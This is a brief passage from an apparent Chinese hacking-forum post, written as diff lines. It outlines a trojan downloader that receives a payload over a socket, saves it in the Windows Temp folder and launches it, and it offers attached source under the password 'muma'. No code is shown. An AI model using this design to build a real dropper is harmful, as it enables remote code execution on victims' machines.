+然后`socket`去发送一段指令，`recv`循环接收，接收完后在`"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\"`下`CreateFile`，然后用`WriteFile`去写入刚才接收的。最后`CreateProcess`去启动。
+
+不足处请前辈们指出。
+
+源程序见附件。
+
+上传的附件
+
+`![](img/620251b33676a8e4b98ca0ece915ee8d.jpg)` | `info.rar` (解压密码是：`muma`)
